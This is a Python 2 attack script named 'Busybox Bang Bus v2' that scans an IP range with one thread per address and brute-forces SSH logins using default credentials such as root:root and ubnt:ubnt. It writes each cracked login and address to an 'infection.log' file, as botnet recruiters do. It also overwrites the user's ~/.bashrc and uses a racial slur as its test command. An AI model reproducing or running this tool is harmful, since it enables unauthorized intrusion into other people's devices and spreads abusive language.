#!/usr/bin/env python
# Busybox Bang Bus v2
# WHATS NEW??? DEEZ NUTZ! HA GOTEM!

import threading, paramiko, random, socket, time, os, sys

os.system("clear")
if len(sys.argv) < 2:
	print "BuSyBoX BaNG BuS v2"
        print "Usage: python "+sys.argv[0]+" [Start IP] [End IP]"
	sys.exit("Example: python "+sys.argv[0]+" 0.0.0.0 255.255.255.255")

sys.stdout.write("\x1b]2;BuSyBoX BaNG BuS\x07")
os.system("clear")
os.system("echo -e 'ulimit -s 999999; ulimit -n 999999; ulimit -u 999999\n' > ~/.bashrc")
os.system("ulimit -s 999999; ulimit -n 999999; ulimit -u 999999")
paramiko.util.log_to_file("/dev/null") #quiets paramiko output
os.system("sysctl -w fs.file-max=999999 >/dev/null")

passwords = [ # argv 0
    "ubnt:ubnt",
    "root:root",
    "root:admin",
    "admin:admin",
    "root:1234",
    "admin:1234",
    "guest:guest",
    "user:user",
    "test:test",
]

raw_input("Press <ENTER> to Enter the Bang Bus")
credit = '# DO NOT SHARE THIS FUCKING SHIT' #throwback lulz
print "\033[0m" + credit + "\033[0m"

def ipRange(start_ip, end_ip):
	start = list(map(int, start_ip.split(".")))
	end = list(map(int, end_ip.split(".")))
	temp = start
	ip_range = []

	ip_range.append(start_ip)
	while temp != end:
		start[3] += 1
		for i in (3, 2, 1):
			if temp[i] == 256:
				temp[i] = 0
				temp[i-1] += 1
		ip_range.append(".".join(map(str, temp)))    

	return ip_range
class sshscanner(threading.Thread):
    def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip)
    global passwords
    def run(self):
        while 1:
			try:
				username='root'
				password="0"
				port = 22
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.settimeout(3)
				s.connect((self.ip, port))
				s.close()
				ssh = paramiko.SSHClient()
				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				dobreak=False
				for passwd in passwords:
					if ":n/a" in passwd:
						password=""
					else:
						password=passwd.split(":")[1]
					if "n/a:" in passwd:
						username=""
					else:
						username=passwd.split(":")[0]
					try:
						ssh.connect(self.ip, port = port, username=username, password=password, timeout=3)
						dobreak=True
						break
					except:
						pass
					if True == dobreak:
						break
				badserver=True
				stdin, stdout, stderr = ssh.exec_command("echo nigger")
				output = stdout.read()
				if "nigger" in output:
					badserver=False	
				if badserver == False:
					os.system("echo -e " +username+ ":" +password+ ":" +self.ip+ " >> infection.log")
					print "\033[31m[\033[32m+\033[31m]\033[0m", random.choice(["\033[32mBuSyBoXiNG -> " +username+ ":" +password+ ":" +self.ip+ "\033[0m",
						"\033[35mBuSyBoXiNG -> " +username+ ":" +password+ ":" +self.ip+ "\033[0m",
						"\033[36mBuSyBoXiNG -> " +username+ ":" +password+ ":" +self.ip+ "\033[0m"])
					ssh.exec_command("echo nigger")
					time.sleep(3)
					ssh.close()
			except:
				pass
ip_range = ipRange("" +sys.argv[1], "" +sys.argv[2])
for ip in ip_range:
	try:				
		t = sshscanner(ip)
		t.start()
	except:
		pass # LiGhT ThA BoSs
